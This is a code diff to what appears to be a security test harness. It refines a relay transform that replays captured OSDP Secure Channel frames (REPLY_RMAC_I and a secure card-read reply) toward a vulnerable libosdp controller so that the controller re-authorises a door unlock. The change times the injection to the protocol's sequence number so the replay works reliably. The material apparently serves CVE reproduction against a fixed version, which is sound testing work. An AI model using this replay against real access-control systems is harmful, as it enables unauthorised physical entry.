@@ -31,6 +31,7 @@ imported lazily inside the functions that need them.
 from __future__ import annotations
 
 import os
+import threading
 from collections.abc import Callable, Iterable, Sequence
 from pathlib import Path
 from typing import TYPE_CHECKING
@@ -135,18 +136,45 @@ def run_cve_replay(
     ]
 
 
+def _next_sequence(seq: int) -> int:
+    """Return the OSDP sequence that follows ``seq`` (wraps 1->2->3->1; 0 precedes 1).
+
+    The 2-bit sequence rides the clear control byte and is never encrypted under Secure Channel,
+    so an inline attacker reads it directly. A command and its reply share a sequence; the next
+    command increments it, skipping 0, so ``(seq % 3) + 1`` gives the CP's next command sequence.
+    """
+    return (seq % 3) + 1
+
+
 def cve_replay_transform(*, armed: Callable[[], bool] = lambda: True) -> Transform:
     """Return a one-shot ``Transform`` that replays captured secure pd->cp frames toward the CP.
 
-    The write-capable (04-03) seam: every frame is forwarded unchanged (Secure Channel comes up
-    transparently) while the relay accumulates the genuine secure pd->cp frames it sees - the
-    handshake ``REPLY_RMAC_I`` and the secure card-read reply. Once ``armed()`` is True, right
-    after the next pd->cp frame it replays those captured frames in-band toward the CP: the
-    REPLY_RMAC_I rewinds the vulnerable CP's r_mac (``sc_activate``), so the replayed card read is
-    accepted and the CP re-issues the authorised unlock (the lock-state flips a second time). A
-    fixed v3.0.8 CP rejects the out-of-state REPLY_RMAC_I, so nothing is re-authorised. Buffers per
-    direction because a chunk is not guaranteed to be a whole frame (Pitfall 5), mirroring
-    ``unlock_transform``."""
+    The write-capable (04-03) seam. Every frame is forwarded unchanged (Secure Channel comes up
+    transparently) while the relay captures a short, sequence-fresh replay blob: it restarts the
+    blob at each handshake ``REPLY_RMAC_I`` it sees pd->cp and then collects the following secure
+    frames through the secure card-read reply (``REPLY_RAW``). Starting at the latest RMAC_I keeps
+    the blob well under the CP's 512-byte rx buffer and never spanning two handshakes.
+
+    Injection is gated on the OSDP sequence, not fired blindly. The CP accepts a reply only when
+    its 2-bit sequence equals the CP's current command sequence (libosdp ``osdp_phy.c``); an
+    unaligned first frame drops the CP offline and the stale bytes left in its rx buffer keep it
+    dead. So once ``armed()`` and the blob is complete, the transform keeps forwarding genuine
+    traffic until it observes a pd->cp frame whose sequence implies the CP's next command will
+    equal the first captured frame's sequence (``_next_sequence(observed) == first_captured``),
+    read from the clear control byte (``control & PKT_CONTROL_SQN``) - a realistic inline-attacker
+    signal, never lab-internal state. It injects the blob exactly once, at that aligned moment.
+
+    The vulnerable v2.4.0 CP accepts the aligned ``REPLY_RMAC_I`` and calls ``sc_activate``,
+    rewinding its r_mac; it then regenerates the identical command chain, so the replayed secure
+    card read verifies and the CP authorises a second unlock. The honest oracle is that CP
+    re-authorisation, not a second PD lock transition: replaying the RMAC_I desynchronises CP<->PD
+    so the CP's re-issued CMD_OUT never reaches the PD. A fixed v3.0.8 CP rejects the out-of-state
+    ``REPLY_RMAC_I`` (``osdp_cp.c`` "Out of order REPLY_RMAC_I"), so nothing is re-authorised.
+
+    Buffers per direction because a chunk is not guaranteed to be a whole frame (Pitfall 5),
+    mirroring ``unlock_transform``. The one-shot decision is guarded by a lock so two pump threads
+    sharing this instance (the fifo relay) can never double-inject.
+    """
     buffers: dict[Direction, bytearray] = {
         Direction.cp_to_pd: bytearray(),
         Direction.pd_to_cp: bytearray(),
@@ -154,9 +182,11 @@ def cve_replay_transform(*, armed: Callable[[], bool] = lambda: True) -> Transfo
     forwarded: dict[Direction, int] = {Direction.cp_to_pd: 0, Direction.pd_to_cp: 0}
     captured: list[bytes] = []
     injected = False
+    sealed = False  # True once the blob has collected through the secure card-read reply
+    lock = threading.Lock()
 
     def transform(direction: Direction, data: bytes) -> bytes:
-        nonlocal injected
+        nonlocal injected, sealed
         buffer = buffers[direction]
         buffer.extend(data)
         frames = list(framer.iter_frames(bytes(buffer)))
@@ -172,11 +202,25 @@ def cve_replay_transform(*, armed: Callable[[], bool] = lambda: True) -> Transfo
                 frame = codec.decode(raw)
             except codec.DecodeError:
                 continue
-            if frame.scb or frame.code == constants.REPLY_RMAC_I:
-                captured.append(raw)  # a genuine secure pd->cp frame, worth replaying
-            if not injected and armed() and captured:
-                out += b"".join(captured)  # replay REPLY_RMAC_I (desync) + the secure card read
-                injected = True
+
+            if frame.code == constants.REPLY_RMAC_I:
+                # Restart the blob at the latest handshake RMAC_I: short and sequence-fresh.
+                captured[:] = [raw]
+                sealed = False
+            elif not sealed and captured and frame.scb:
+                captured.append(raw)  # collect the secure frames that follow the RMAC_I
+                if frame.code == constants.REPLY_RAW:
+                    sealed = True  # captured through the secure card-read reply: blob complete
+
+            if sealed and captured and armed():
+                first_seq = codec.decode(captured[0]).control & constants.PKT_CONTROL_SQN
+                observed_seq = frame.control & constants.PKT_CONTROL_SQN
+                if _next_sequence(observed_seq) == first_seq:
+                    with lock:
+                        if not injected:
+                            # Replay REPLY_RMAC_I (desync) + the secure card read, in sequence.
+                            out += b"".join(captured)
+                            injected = True
         return bytes(out)
 
     return transform
